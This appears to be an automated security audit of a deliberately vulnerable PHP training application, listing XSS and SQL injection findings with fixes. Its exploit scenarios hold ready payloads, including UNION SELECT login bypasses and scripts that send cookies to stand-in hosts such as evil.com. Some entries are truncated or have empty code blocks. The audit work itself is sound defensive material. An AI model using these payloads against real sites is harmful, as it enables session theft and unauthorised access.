`$_SERVER["PHP_SELF"]` becomes `/xss_php_self.php/"><script>alert(document.cookie)</script>`. At security level 0, `no_check()` returns this unchanged, and it is emitted into the form action, breaking out of the attribute. When a victim visits this URL, the injected JavaScript executes in their browser, stealing session cookies or performing actions as the victim.
findings.recommendation: Use `htmlspecialchars($_SERVER["PHP_SELF"], ENT_QUOTES, "UTF-8")` when embedding PHP_SELF in HTML, or replace the action attribute with a hardcoded value (e.g., `action=""` for self-submitting forms) so PHP_SELF is never reflected.

findings.title: Reflected XSS via firstname and lastname GET parameters
findings.description: On lines 72–73, user-supplied GET parameters `firstname` and `lastname` are read directly from `$_GET`. On line 83, they are reflected into HTML output: `echo "Welcome " . xss($firstname) . " " . xss($lastname);`. When security_level cookie is "0" or unset, the `xss()` function calls `no_check()` (lines 25–27, 40–42), which performs no sanitization. The raw attacker-controlled values are embedded directly into the page's HTML body, enabling full arbitrary script injection.
findings.exploit_scenario:
An attacker crafts a URL like:
  http://target/xss_php_self.php?form=submit&firstname=%3Cscript%3Ealert(document.cookie)%3C/script%3E&lastname=Doe
At security level 0, the response body contains: `Welcome <script>alert(document.cookie)</script> Doe`. A victim clicking this link executes the attacker's JavaScript in their browser session, enabling cookie theft, keylogging, or phishing within the application.
findings.recommendation: Apply `htmlspecialchars($data, ENT_QUOTES, "UTF-8")` (or equivalent output encoding) at the point of HTML emission rather than relying on a security-level-gated wrapper. Ensure sanitization is always enforced regardless of cookie-controlled security level.

findings.title: SQL injection in login form via unsanitized POST parameters
findings.description: At security level 0 (the default), user-supplied `$_POST["login"]` and `$_POST["password"]` pass through `sqli()` which calls `no_check()` — a no-op sanitization function. Both values are concatenated directly into a SQL query string on line ~90: `$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'"`. An attacker controls both the login and password fields entirely, enabling classic SQL injection (authentication bypass, data exfiltration via UNION SELECT, etc.).
findings.exploit_scenario: An attacker submits login = `' UNION SELECT 1,'admin','secret','<script>alert(1)</script>','hero' -- ` and any password. The query becomes `SELECT * FROM heroes WHERE login = '' UNION SELECT 1,'admin',...` which returns a controlled row, bypassing authentication entirely and exfiltrating or controlling all returned column values.
findings.recommendation: Use parameterized queries (prepared statements) instead of string concatenation. Replace the `mysql_*` API (deprecated/removed in modern PHP) with PDO or mysqli prepared statements.

findings.title: Reflected XSS via unencoded database output in login welcome message
findings.description:
When a login succeeds, the values of `$row["login"]` and `$row["secret"]` from the database query result are embedded directly into HTML on line ~101 without any HTML entity encoding: `$message = "

Welcome " . ucwords($row["login"]) . "...Your secret: " . ucwords($row["secret"]) . "

"`. This value is later `echo`ed on line ~112. Because the SQL query is injectable (Finding 01), an attacker can use a UNION SELECT to supply arbitrary HTML/JS as the returned `login` and `secret` column values. Even without SQL injection, if any hero row in the database contains HTML in its `login` or `secret` field, logging in as that hero triggers stored XSS.
findings.exploit_scenario: An attacker POSTs: `login=' UNION SELECT 1,'<script>fetch("http://evil.com/steal?c="+document.cookie)</script>','<script>alert(1)</script>','x','y'--`. The UNION SELECT returns attacker-controlled strings in the `login` and `secret` columns. These are echoed unescaped into the HTML response, executing arbitrary JavaScript in the victim's browser session — stealing session cookies or performing actions as the authenticated user.
findings.recommendation: Apply `htmlspecialchars()` (with ENT_QUOTES and the appropriate charset) to all database values before embedding them in HTML output. Additionally, use prepared statements to prevent the underlying SQL injection that makes injection of arbitrary content trivial.

findings.title: Reflected XSS via POST parameters firstname/lastname at security level 0
findings.description: Untrusted input enters at lines 111-112 via `$_POST["firstname"]` and `$_POST["lastname"]`. These values are passed through the `xss()` function (defined starting at line 27), which dispatches on the `security_level` cookie. When the cookie is "0" (the default/low setting), `no_check($data)` is called (line 33), which performs no sanitization. The return value is then embedded directly into HTML via `echo` at line 125: `echo "Welcome " . xss($firstname) . " " . xss($lastname);`. An attacker who can set the security level cookie to "0" (or who targets a user at that level) can inject arbitrary HTML/JavaScript that executes in the victim's browser.
findings.exploit_scenario: An attacker crafts a page that auto-submits a form via POST to the vulnerable endpoint with `firstname` set to `<script>document.location='https://evil.example.com/steal?c='+document.cookie</script>` and `lastname` set to anything. If the victim's `security_level` cookie is "0", the script executes in their browser context, exfiltrating session cookies or performing actions as the victim.
findings.recommendation: Apply context-aware output encoding (HTML entity encoding for HTML body context) to all user-supplied data before embedding it in the response, regardless of security level setting. Use `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')` at the point of output on line 125. Do not rely solely on a toggleable security level for protection.

findings.title: Stored XSS via unsanitized session login username in welcome message
findings.description:
The value stored in `$_SESSION["login"]` is echoed directly into the HTML response with only `ucwords()` applied (which capitalizes words but does NOT HTML-encode). The relevant line is:

```php
<font color="red">Welcome <?php if(isset($_SESSION["login"])){echo ucwords($_SESSION["login"]);}?></font>
```

If the application's user-creation or login flow (e.g., `user_extra.php` linked on line 38) stores a username containing HTML/JavaScript without sanitizing it into the session, then that payload is rendered in the browser of any page displaying this welcome banner. `ucwords()` operates on character casing only and provides zero XSS protection. No output encoding (`htmlspecialchars`) is applied at the sink.
findings.exploit_scenario: An attacker uses the "Create User" functionality to register a username like `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. When that user logs in and the session stores this value as `$_SESSION["login"]`, every page rendering the welcome header — including this one — will execute the attacker's JavaScript in the victim's browser context. If an admin later views a page while the malicious session is active (or if the payload persists across sessions), the attacker steals session cookies.
findings.recommendation: Apply `htmlspecialchars($_SESSION["login"], ENT_QUOTES, "UTF-8")` at the output point, and additionally sanitize the username at the point of storage during registration/login to prevent storage of malicious payloads.

findings.title: Potential XSS via unsanitized bug name from bugs.txt in select options
findings.description:
The `$bugs` array (loaded from `bugs.txt` via `selections.php`) is iterated and each entry is split by comma. The first field `$bug[0]` is echoed directly into an HTML `<option>` tag without encoding:

echo "<option value='$key'>$bug[0]</option>";

While `bugs.txt` is a server-side configuration file not directly user-controlled in normal operation, the `$key` is embedded inside a single-quoted HTML attribute (`value='$key'`) and `$bug[0]` is placed in element content — both without `htmlspecialchars()` encoding. If any other vulnerability (e.g., file write, path traversal) allows modification of `bugs.txt`, this becomes exploitable. Additionally, `$key` inside single-quoted attributes could break out if values are unexpected.
findings.exploit_scenario: If an attacker can write to or modify `bugs.txt` through a separate file-write or path-traversal vulnerability, they could inject a line like `Bug</option><script>alert(document.cookie)</script>,xss_phpmyadmin.php`. When parsed, `$bug[0]` would contain the script tag, which would execute in the browser of any user viewing the bug selection dropdown.
findings.recommendation: Apply `htmlspecialchars()` with `ENT_QUOTES` to both `$key` and `$bug[0]` before echoing into HTML:

findings.title: Reflected XSS via HTTP Referer header with no sanitization at security level 0
findings.description:
The `$_SERVER["HTTP_REFERER"]` value — fully attacker-controlled — is read on line 96 (`$referer = $_SERVER["HTTP_REFERER"]`) and then echoed directly into the HTML response on line 97: `echo "

The referer: " . xss($referer) . "

";`. The local `xss()` function (lines 20–45) dispatches on `$_COOKIE["security_level"]`. At security level 0 (the default), `no_check($data)` is called, which performs no sanitization whatsoever, returning the raw input. This means the attacker-supplied Referer value is injected verbatim into the page HTML.
findings.exploit_scenario: An attacker crafts an HTTP request to the vulnerable endpoint with a malicious Referer header such as `Referer: <script>document.location='http://evil.com/steal?c='+document.cookie</script>`. If the victim's security_level cookie is set to 0 (low), the server echoes the script tag into the response body and the JavaScript executes in the victim's browser context, exfiltrating session cookies to the attacker's server.
findings.recommendation: Apply context-aware output encoding to the Referer value before embedding it in HTML. Use `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')` at the point of echo (line 97), regardless of any security-level toggle. Remove the security-level-gated sanitization bypass so that all levels are protected.

findings.title: Stored XSS via blog entry rendered without encoding at security level 0
findings.description: User-supplied input from `$_POST["entry"]` (line 61) passes through the `xss()` function (line 65). At `security_level == "0"` (the default), `xss()` only applies `sqli_check_3()` — no HTML encoding or XSS sanitization is performed (lines 37–39; the `xss_check_4`/`xss_check_3` calls are commented out at levels 1 and 2 as well). The unsanitized value is stored in the database via an INSERT statement (line 73). When blog entries are later retrieved and rendered (lines 175–215), at `security_level == "0"` the code reaches line 210: `<?php echo $row->entry; ?>`, which outputs the stored entry directly into the HTML response with no encoding whatsoever. Any HTML/JavaScript in the entry is executed in the browser of every user who views the blog.
findings.exploit_scenario: An attacker submits a blog entry with the value `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. The entry is stored in the database. When any user (including admins) later views the blog page, the script executes in their browser, sending their session cookie to the attacker's server. The attacker can then hijack the victim's session.
findings.recommendation: Apply context-appropriate output encoding to all user-controlled data before rendering in HTML. At minimum, use `htmlspecialchars($row->entry, ENT_QUOTES, 'UTF-8')` when echoing the entry. Alternatively, enable the existing `xss_check_3` or `xss_check_4` functions in the `xss()` input-processing function for all security levels.

findings.title: Stored XSS at security levels 1 and 2 — input-side XSS checks commented out
findings.description: In the `xss()` function (lines 32–56), the XSS sanitization calls are commented out for both security level 1 (line 46: `// $data = xss_check_4($data);`) and security level 2 (line 51: `// $data = xss_check_3($data);`). This means malicious HTML/JS is stored verbatim in the database at all security levels. While output-side encoding is applied at levels 1 (`xss_check_4`, line 189) and 2 (`xss_check_3`, line 179), defense-in-depth is broken: if the output rendering path is ever changed or bypassed, the raw payload persists in the database. More critically, if `xss_check_4` (level 1) provides only partial sanitization (e.g., blocks `
findings.exploit_scenario: An attacker at security level 1 submits a blog entry like ``. The input is stored unmodified because the XSS check in `xss()` is commented out. If `xss_check_4` only strips `
findings.recommendation: Uncomment and enforce the `xss_check_4` and `xss_check_3` calls inside the `xss()` function at levels 1 and 2 (lines 46 and 51) so that sanitization is applied at both input and output time (defense in depth). Additionally, prefer output-side encoding over input-side filtering for robust XSS prevention.

findings.title: Stored XSS via unsanitized session login echoed in HTML
findings.description: The value of $_SESSION["login"] is echoed directly into the HTML response without HTML-encoding on line 78: `echo ucwords($_SESSION["login"])`. If the user registration or login flow stores a username containing HTML/JavaScript without sanitization (e.g., in user_extra.php), the malicious payload persists in the session and executes on every page load that renders the welcome message. The attacker controls the username at account-creation time; the sink is the unescaped echo in the template.
findings.exploit_scenario: An attacker creates a user with username `bee<script>alert(1)</script>` via the Create User page. After logging in, every page including this one renders `Welcome Bee<script>alert(1)</script>`, executing the attacker's JavaScript in the victim's browser session when the victim views any page that displays the login name.
findings.recommendation: HTML-encode the session login before output: `echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, "UTF-8");`

findings.title: XSS via unsanitized $bugs array values echoed in select options
findings.description: On line 147, values from the `$bugs` array (populated in `selections.php`, which reads from `bugs.txt`) are exploded and echoed directly into HTML without encoding: `echo "<option value='$key'>$bug[0]</option>";`. Both `$key` (inside single-quoted attribute) and `$bug[0]` (in element content) are unescaped. If `bugs.txt` can be modified through a separate vulnerability (e.g., a file-write or path-traversal flaw elsewhere in the application), an attacker can inject arbitrary HTML/JavaScript into the select dropdown.
findings.exploit_scenario: An attacker exploits a separate file-write or path-traversal vulnerability to inject `"><script>alert(document.cookie)</script>,xss_sqlitemanager.php` into `bugs.txt`. When any user loads this page, the script executes within the authenticated session context, allowing session hijacking.
findings.recommendation: HTML-encode both the attribute value and the element content: `echo "<option value='" . htmlspecialchars($key, ENT_QUOTES, "UTF-8") . "'>" . htmlspecialchars($bug[0], ENT_QUOTES, "UTF-8") . "</option>";`

findings.title: Potential XSS via $security_level echoed without encoding
findings.description: On line 114, `$security_level` is echoed directly into HTML: `<?php echo $security_level?>`. This variable is set in `security_level_check.php` (not in scope). If the security-level value is derived from user input (e.g., a cookie or POST parameter) without validation and stored in a way that allows non-numeric content, it could be used for injection. The value is expected to be an integer (0/1/2), so this requires either validation bypass or corruption of the data source.
findings.exploit_scenario: If the security level is read from a cookie without strict validation and an attacker sets the cookie to `high`, the script would execute when the page renders the current security level display.
findings.recommendation: Ensure `$security_level` is validated as an integer and HTML-encoded before output: `echo htmlspecialchars($security_level, ENT_QUOTES, "UTF-8");`

findings.title: Stored XSS via unsanitized cookie storage of user-controlled genre input
findings.description: At security level 0 (and the default fallback case), the user-supplied `genre` parameter from `$_REQUEST["genre"]` (line 33) is written directly into the `movie_genre` cookie via `setcookie()` (line 39) with no sanitization or validation. The HTML `<select>` on line 115 restricts visible choices, but `$_REQUEST["genre"]` can contain any arbitrary value since an attacker can craft a direct HTTP request bypassing the form. The cookie value is stored in the browser and will be replayed on every subsequent request, making it a stored XSS vector when any page renders `$_COOKIE["movie_genre"]` without output encoding. The default case (lines 56–60) also stores raw input, meaning any unrecognized security_level cookie value silently disables protection.
findings.exploit_scenario: An attacker sends a GET request to xss_stored_2.php with genre=<script>alert(document.cookie)</script> while the security level is set to 0 (low). The malicious payload is stored in the movie_genre cookie. On any subsequent page that reads and renders $_COOKIE["movie_genre"] without HTML encoding, the script executes in the victim's browser context, enabling session hijacking or other actions on behalf of the user.
findings.recommendation: Always validate and sanitize user input before storing it in cookies, regardless of security level. Apply output encoding (htmlspecialchars) at minimum when setting the cookie value, and ideally validate against a strict whitelist of allowed genre values (as done in security level 2). Remove the default fallback that bypasses sanitization.

findings.title: Stored XSS via secret parameter at security level 0
findings.description: At security_level 0, user-supplied `$_REQUEST["secret"]` flows through `xss()` which calls `no_check()` (line 39), returning the data completely unsanitized. While `mysqli_real_escape_string` (line 70) prevents SQL injection, it does not encode HTML entities. The raw value is persisted into the `users.secret` column via the UPDATE query on line 73. Any subsequent page that reads and renders this secret (e.g., a user-profile or admin panel) will execute the embedded JavaScript in the browser of whoever views it. This is a classic stored/persistent XSS: the payload survives in the database and attacks victims on read, not on write.
findings.exploit_scenario: An authenticated attacker submits POST `secret=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` with `login` set. At security level 0 the value is stored verbatim. When an admin later views the user's secret (e.g., via an admin user-management page), the script exfiltrates the admin's session cookie to the attacker.
findings.recommendation: Apply `htmlspecialchars($data, ENT_QUOTES, "UTF-8")` before storing the secret, or at minimum before rendering it. The MEDIUM/HIGH branch already does this (line 99); apply the same encoding unconditionally for all security levels.

findings.title: Reflected XSS via login parameter injected into hidden form field
findings.description: At security_level 0, when `$_REQUEST["login"]` is set (line 67), it overwrites the session-derived `$login`. The value passes through `mysqli_real_escape_string` (line 69) — which only escapes SQL meta-characters — and is then echoed unescaped into an HTML attribute at line 157: `<input type="hidden" name="login" value="<?php echo $login;?>">`. An attacker can break out of the `value` attribute with a payload like `" onfocus="alert(1)" autofocus="` or `" /><script>alert(1)</script>`, achieving reflected XSS in the response body.
findings.exploit_scenario: An attacker crafts a URL or form that POSTs `login=" /><script>alert(document.cookie)</script>&secret=anything&action=change` while the cookie security_level is 0. The server reflects the login value into the hidden input without HTML encoding, causing the script to execute in the victim's browser when the response renders.
findings.recommendation: Always HTML-encode `$login` with `htmlspecialchars($login, ENT_QUOTES, "UTF-8")` before echoing it into the HTML attribute on line 157. Do not rely on `mysqli_real_escape_string` for HTML context safety.

findings.title: Stored XSS via User-Agent header rendered without output encoding
findings.description: The attacker-controlled HTTP User-Agent header ($_SERVER["HTTP_USER_AGENT"], line 48) is stored into the database (line 54, INSERT query) and into a log file (line 66). When the stored records are later retrieved (line 74, SELECT) and rendered into HTML, the user_agent value is output with a raw `echo` (line ~131: `<?php echo $row->user_agent; ?>`) with no HTML-entity encoding at the point of output. At security_level 0 (the default), the `xss()` function delegates to `no_check()`, which returns the input unchanged. This means arbitrary HTML/JavaScript supplied in the User-Agent header is stored as-is and executed in the browser of every subsequent visitor who views the page. Even at level 1, `xss_check_4` is applied at *storage* time rather than at *output* time, which is a fragile defense that can be bypassed by payloads that mutate after sanitization (e.g., double-encoding, context-dependent bypasses).
findings.exploit_scenario: An attacker sends an HTTP request to the application with the User-Agent header set to `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. This payload passes through `no_check()` at security level 0, is inserted into the `visitors` table, and is then rendered unescaped in the HTML response for every user who subsequently loads the page. All visitors' session cookies are exfiltrated to the attacker's server.
findings.recommendation: Apply context-appropriate output encoding at the point of rendering rather than at storage time. Replace `<?php echo $row->user_agent; ?>` with `<?php echo htmlspecialchars($row->user_agent, ENT_QUOTES, 'UTF-8'); ?>`. Apply the same encoding to the date and ip_address fields. Retain input validation as a secondary defense but never rely on it alone for XSS prevention.

findings.title: Reflected XSS via User-Agent header at security level 0
findings.description:
Line 80 reads the fully attacker-controlled HTTP User-Agent header (`$_SERVER["HTTP_USER_AGENT"]`) and passes it through the `xss()` function (line 60). When `$_COOKIE["security_level"]` is "0" (the default), the `xss()` function calls `no_check($data)` (line 65) which performs no sanitization. The result is then directly interpolated into HTML via `echo` on line 80: `echo "

Your User-Agent: " . xss($user_agent) . "

";`. An attacker who controls the User-Agent header can inject arbitrary HTML/JavaScript that executes in the victim's browser context.
findings.exploit_scenario: An attacker sends an HTTP request to this page with a malicious User-Agent header such as `User-Agent: <script>document.location='http://evil.com/steal?c='+document.cookie</script>`. If the victim's security level is set to "low" (0), the script executes when the response is rendered. This could be leveraged in scenarios where an attacker can influence a victim's HTTP requests (e.g., via a proxy, a link opened through a Flash/Java applet that allows custom headers, or a stored page that reflects headers back in an admin/log view). Session cookies marked without HttpOnly would be exfiltrated.
findings.recommendation: Apply context-aware output encoding (HTML entity encoding) to the User-Agent value before embedding it in HTML, regardless of security level setting. For example, use `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')`. Additionally, the security level should default to the most restrictive sanitization rather than none.

findings.title: Stored XSS via unescaped $_SESSION["login"] in JavaScript context
findings.description:
The session login value is echoed directly into a JavaScript string literal inside a <script> block without any escaping (line 89):

```php
xmlHttp.send("<reset><login><?php if(isset($_SESSION["login"])){echo $_SESSION["login"];}?></login><secret>Any bugs?</secret></reset>");
```

The same unescaped value also appears in an HTML context on line 76:
```php
<font color="red">Welcome <?php if(isset($_SESSION["login"])){echo ucwords($_SESSION["login"]);}?></font>
```

If `$_SESSION["login"]` contains a payload like `</script><script>alert(document.cookie)</script>`, the first echo (line 89) will break out of the script tag and execute arbitrary JavaScript. The value originates from the session, which is set during login/registration — making this a stored XSS vector. The application exposes a "Create User" feature (`user_extra.php`) which could allow registering a username containing the XSS payload.
findings.exploit_scenario: An attacker registers a user account via user_extra.php with a crafted username such as `</script><script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. When that user (or any context where this login is rendered) visits xxe-1.php, the malicious JavaScript executes in the victim's browser, exfiltrating session cookies or performing actions on behalf of the user.
findings.recommendation: Apply context-appropriate output encoding. For the JavaScript context, use `json_encode()` around the value: `echo json_encode($_SESSION["login"])`. For the HTML context, use `htmlspecialchars()`: `echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, "UTF-8")`.

findings.title: SQL injection via unsanitized XML-parsed login and secret fields
findings.description: When `$_COOKIE["security_level"]` is not "1" or "2", the code parses the raw POST body as XML (line 31: `simplexml_load_string($body)`) and extracts `$login` and `$secret` directly from the resulting object (lines 36–37). Both values are concatenated into an UPDATE SQL statement on line 45 without parameterization or escaping — the `mysqli_real_escape_string` calls are commented out on lines 42–43. An attacker controls both the XML structure and field values, giving full control over the SQL query.
findings.exploit_scenario:
An attacker sends a POST request with `Content-Type: application/xml`, cookie `security_level=0`, and body:
```

```
This sets every user's secret to "pwned". More targeted payloads could extract data via error-based or blind injection.
findings.recommendation: Use prepared statements with bound parameters for the SQL query. Uncomment the `mysqli_real_escape_string` calls as a secondary mitigation, but parameterized queries are the proper fix.
